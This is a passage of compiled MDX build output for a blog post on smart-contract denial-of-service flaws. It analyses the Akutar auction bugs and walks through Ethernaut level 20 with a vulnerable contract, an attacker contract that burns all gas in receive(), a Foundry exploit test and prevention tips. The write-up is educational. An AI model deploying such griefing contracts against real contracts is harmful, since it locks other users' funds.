0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:509,columnNumber:1},this),`\n`,(0,t.jsxDEV)(b,{caption:\"processRefunds function [line 156]\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:544,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:[\"On \",(0,t.jsxDEV)(n.strong,{children:(0,t.jsxDEV)(n.em,{children:\"line 22\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:546,columnNumber:6},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:546,columnNumber:4},this),\" of \",(0,t.jsxDEV)(n.code,{children:\"processRefunds()\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:546,columnNumber:21},this),\", a require statement is used. This could revert the whole transaction whenever \",(0,t.jsxDEV)(n.em,{children:\"a single refund failed\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:546,columnNumber:119},this),`.\nA Denial of Service attack that forever stop `,(0,t.jsxDEV)(n.code,{children:\"processFunds()\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:547,columnNumber:46},this),\" could be conduct in the following manner:\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:546,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.ol,{children:[`\n`,(0,t.jsxDEV)(n.li,{children:[\"A smart contract, i.e. \",(0,t.jsxDEV)(n.code,{children:\"AttackerContract\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:549,columnNumber:27},this),\", participate in auction and mint some NFTs (permissible from given source code) at a suitable index.\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:549,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:[\"The contract implements a \",(0,t.jsxDEV)(n.code,{children:\"receive()\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:550,columnNumber:30},this),\" function that always revert => \",(0,t.jsxDEV)(n.code,{children:\"processRefunds()\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:550,columnNumber:73},this),\" will revert at \",(0,t.jsxDEV)(n.code,{children:\"AttackerContract\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:550,columnNumber:107},this),\"'s bidding index.\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:550,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:[\"Other bidder won't be able to get their refunds as \",(0,t.jsxDEV)(n.code,{children:\"processRefunds()\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:551,columnNumber:55},this),\" always revert and \",(0,t.jsxDEV)(n.code,{children:\"refundProgress\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:551,columnNumber:92},this),\" will be stuck forever.\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:551,columnNumber:1},this),`\n`]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:549,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.h2,{children:\"Bug 02: claimProjectFunds\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:553,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:[\"This is a much more naive mistake by AkuDream's team. In \",(0,t.jsxDEV)(n.code,{children:\"claimProjectFunds()\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:555,columnNumber:58},this),\" \",(0,t.jsxDEV)(n.strong,{children:(0,t.jsxDEV)(n.em,{children:\"line 3-4\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:555,columnNumber:82},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:555,columnNumber:80},this),\", \",(0,t.jsxDEV)(n.code,{children:\"refundProgress\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:555,columnNumber:96},this),\" should keep track of \",(0,t.jsxDEV)(n.code,{children:\"bidIndex\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:555,columnNumber:134},this),\" instead of \",(0,t.jsxDEV)(n.code,{children:\"totalBids\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:555,columnNumber:156},this),`.\nTherefore, this function will never work as the project sold out, and `,(0,t.jsxDEV)(n.code,{children:\"refundProgress\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:556,columnNumber:71},this),\" is always smaller than \",(0,t.jsxDEV)(n.code,{children:\"totalBids\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:556,columnNumber:111},this),`.\nAs a consequence, 11,539.5 ETH is stuck forever in the `,(0,t.jsxDEV)(n.a,{href:\"https://etherscan.io/address/0xf42c318dbfbaab0eee040279c6a2588fa01a961d#code\",children:\"AkuAuction contract\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:557,columnNumber:56},this)]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:555,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.pre,{children:(0,t.jsxDEV)(n.code,{className:\"language-solidity\",children:`function claimProjectFunds() external onlyOwner {\n  require(block.timestamp > expiresAt, \"Auction still in progress\");\n  require(refundProgress >= totalBids, \"Refunds not yet processed\");\n  require(akuNFTs.airdropProgress() >= totalBids, \"Airdrop not complete\");\n\n  (bool sent, ) = project.call{ value: address(this).balance }(\"\");\n  require(sent, \"Failed to withdraw\");\n}\n`},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:559,columnNumber:1},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:559,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.h1,{children:\"Ethernaut Level 20 - DoS attack\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:570,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:[(0,t.jsxDEV)(n.a,{href:\"https://ethernaut.openzeppelin.com/level/20\",children:\"This level\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:572,columnNumber:1},this),` of Ethernaut introduce Denial of Service attack.\nPass this level by denying the `,(0,t.jsxDEV)(n.code,{children:\"Denial\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:573,columnNumber:32},this),\" contract owner from withdrawing funds (whilst the contract still has funds, and the transaction is of 1M gas or less).\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:572,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.pre,{children:(0,t.jsxDEV)(n.code,{className:\"language-solidity\",children:`// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ncontract Denial {\n    address public partner; // withdrawal partner - pay the gas, split the withdraw\n    address public constant owner = address(0xA9E);\n    uint timeLastWithdrawn;\n    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances\n\n    function setWithdrawPartner(address _partner) public {\n        partner = _partner;\n    }\n\n    // withdraw 1% to recipient and 1% to owner\n    function withdraw() public {\n        uint amountToSend = address(this).balance / 100;\n        // perform a call without checking return\n        // The recipient can revert, the owner will still get their share\n        partner.call{value:amountToSend}(\"\");\n        payable(owner).transfer(amountToSend);\n        // keep track of last withdrawal time\n        timeLastWithdrawn = block.timestamp;\n        withdrawPartnerBalances[partner] +=  amountToSend;\n    }\n\n    // allow deposit of funds\n    receive() external payable {}\n\n    // convenience function\n    function contractBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n`},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:575,columnNumber:1},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:575,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.h2,{children:\"Strategy analysis\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:610,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:[\"A few keynotes from the \",(0,t.jsxDEV)(n.code,{children:\"Denial\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:612,columnNumber:25},this),\" contract:\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:612,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.ul,{children:[`\n`,(0,t.jsxDEV)(n.li,{children:[(0,t.jsxDEV)(n.code,{children:\"setWithdrawPartner\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:614,columnNumber:3},this),\" is public\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:614,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:\"withdraw partner is not limited to EOA (can be a smart contract).\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:615,columnNumber:1},this),`\n`]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:614,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:\"In order to stop owner from withdrawing funds, one of the following must happen:\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:617,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.ol,{children:[`\n`,(0,t.jsxDEV)(n.li,{children:[\"the call to \",(0,t.jsxDEV)(n.code,{children:\"withdraw()\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:619,columnNumber:16},this),\" is reverted.\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:619,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:\"fund is exhausted before owner receive their share (line 20) => impractical since withdraw 1% balance each time.\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:620,columnNumber:1},this),`\n`]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:619,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:[\"For the 1st case, withdrawal partner receive their share by a low-level \",(0,t.jsxDEV)(n.code,{children:\"call\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:622,columnNumber:73},this),\" statement on \",(0,t.jsxDEV)(n.strong,{children:(0,t.jsxDEV)(n.em,{children:\"line 19\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:622,columnNumber:95},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:622,columnNumber:93},this),`.\nTherefore making this call failed, i.e. a simple `,(0,t.jsxDEV)(n.code,{children:\"revert()\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:623,columnNumber:50},this),\" or \",(0,t.jsxDEV)(n.code,{children:\"assert(false)\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:623,columnNumber:64},this),` statement, won't do the trick.\nInstead, the partner contract need to:`]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:622,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.ul,{children:[`\n`,(0,t.jsxDEV)(n.li,{children:[\"execute \",(0,t.jsxDEV)(n.code,{children:\"while(true) { <some_statement>; }\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:626,columnNumber:11},this),\" to consume all gas => OutOfGas reversal error.\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:626,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:[\"OR perform re-entrancy on \",(0,t.jsxDEV)(n.code,{children:\"withdraw()\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:627,columnNumber:29},this),\" => exhaust the call stack by consuming all gas => same OutOfGas error.\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:627,columnNumber:1},this),`\n`]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:626,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.h2,{children:\"Implementation\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:629,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:\"Create an attacker contract as follow:\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:631,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.pre,{children:(0,t.jsxDEV)(n.code,{className:\"language-solidity\",children:`// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\nimport \"./Denial.sol\";\n\ncontract DenialAttack {\n  uint256 i;\n  Denial DenialContract;\n\n  constructor(address payable denialAddr) {\n    DenialContract = Denial(denialAddr);\n  }\n\n  function attack() public {\n    DenialContract.setWithdrawPartner(address(this));\n  }\n\n  receive() external payable {\n    while (true) {\n      i += 1;\n    }\n  }\n}\n`},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:633,columnNumber:1},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:633,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:\"Then a flow of this attack is:\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:659,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.pre,{children:(0,t.jsxDEV)(n.code,{className:\"language-solidity\",children:`// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport \"~/DoS/Denial.sol\";\nimport \"~/DoS/DenialAttack.sol\";\n\ncontract DenialTest is Test {\n  address owner = vm.addr(1);\n  address hacker = vm.addr(2);\n\n  function setUp() public {}\n\n  function testReentranceAttack() public {\n    uint256 initialGas = gasleft();\n    vm.startPrank(owner);\n    Denial DenialContract = new Denial();\n    address payable denialAddr = payable(address(DenialContract));\n    vm.deal(denialAddr, 100 ether); // Deal 100 ether to the Denial contract.\n    DenialContract.setWithdrawPartner(hacker);\n\n    // verify that withdraw is successful.\n    DenialContract.withdraw();\n    assertEq(owner.balance, 1 ether, \"owner balance should be 1 ETH\");\n    assertEq(hacker.balance, 1 ether, \"hacker (current partner) balance should be 1 ETH\");\n    vm.stopPrank();\n\n    // Hacker exploit the smart contract.\n    vm.startPrank(hacker);\n    DenialAttack exploiterContract = new DenialAttack(denialAddr);\n    exploiterContract.attack();\n    assertEq(DenialContract.partner(), address(exploiterContract)); // confirm withdraw partner\n    vm.stopPrank();\n\n    // Simulate a hypothetical \"infinite\" gas limit, transaction revert \"OutOfGas\".\n    uint256 INFINITE_GAS = 30_000_000;\n    vm.expectRevert(\"Out of Gas\");\n    vm.prank(owner);\n    (bool result, ) = denialAddr.call{ gas: INFINITE_GAS }(abi.encodeWithSignature(\"withdraw()\"));\n    uint256 gasUsed = initialGas - gasleft();\n    assert(!result && gasUsed > INFINITE_GAS);\n  }\n}\n`},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:661,columnNumber:1},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:661,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.h2,{children:\"Preventation\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:707,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:\"For the specific example from Ethernaut lvl 20, we can:\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:709,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.ol,{children:[`\n`,(0,t.jsxDEV)(n.li,{children:[\"Guard from re-entrancy, \",(0,t.jsxDEV)(n.a,{href:\"https://philho.xyz/blog/smart_contract/reentrance_attack\",children:\"see\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:711,columnNumber:28},this)]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:711,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:[\"Restrict \",(0,t.jsxDEV)(n.code,{children:\"setWithdrawPartner\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:712,columnNumber:13},this),\" to:\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:712,columnNumber:1},this),`\n`]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:711,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.ul,{children:[`\n`,(0,t.jsxDEV)(n.li,{children:\"contract owner (then choose trusted partner) OR\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:714,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:[\"EOA only, e.g. \",(0,t.jsxDEV)(n.a,{href:\"https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/\",children:\"consensys note\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:715,columnNumber:18},this)]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:715,columnNumber:1},this),`\n`]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:714,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.h1,{children:\"Conclusion\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:717,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:`In conclusion, DDoS attacks pose a significant threat to smart contracts.\nProtecting against DDoS attacks involves implementing measures specific to each contract's requirements.`},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:719,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:`It's important to note that DDoS vulnerabilities often stem from flawed logic within the contract itself.\nTherefore, it's best to use fool-proof functions and have a good understand of EVM calls.`},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:722,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.h1,{children:\"References\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:725,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.ol,{children:[`\n`,(0,t.jsxDEV)(n.li,{children:(0,t.jsxDEV)(n.a,{href:\"https://blocksecteam.medium.com/how-akutar-nft-loses-34m-usd-60d6cb053dff\",children:\"How Akutar NFT loses 34M USD\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:727,columnNumber:4},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:727,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:(0,t.jsxDEV)(n.a,{href:\"https://etherscan.io/address/0xf42c318dbfbaab0eee040279c6a2588fa01a961d#code\",children:\"AkuAuction (auction contract)\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:728,columnNumber:4},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:728,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:(0,t.jsxDEV)(n.a,{href:\"https://etherscan.io/address/0xaad35c2dadbe77f97301617d82e661776c891fa9#code\",children:\"Akutar (NFT contract)\"},void 